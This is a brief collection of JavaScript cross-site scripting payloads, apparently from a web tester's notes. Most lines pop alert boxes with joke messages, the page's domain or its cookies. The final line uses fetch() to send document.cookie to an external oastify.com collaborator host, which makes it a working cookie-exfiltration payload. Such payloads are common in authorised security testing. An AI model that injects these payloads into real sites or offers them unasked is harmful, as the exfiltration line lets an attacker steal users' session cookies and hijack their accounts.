alert("⚠️ Uh-oh! XSS just happened! Time to call the devs 👨‍💻👩‍💻")
alert("🚨 Boom! XSS in action!\nYour page has been hacked... just kidding 😄");
alert(document.domain);
alert(document.cookie);
fetch('https://f2isog9e26yzurtslhxs8hqfz65xtokc9.oastify.com/a?a='+encodeURI(document.cookie), {mode:'no-cors'})
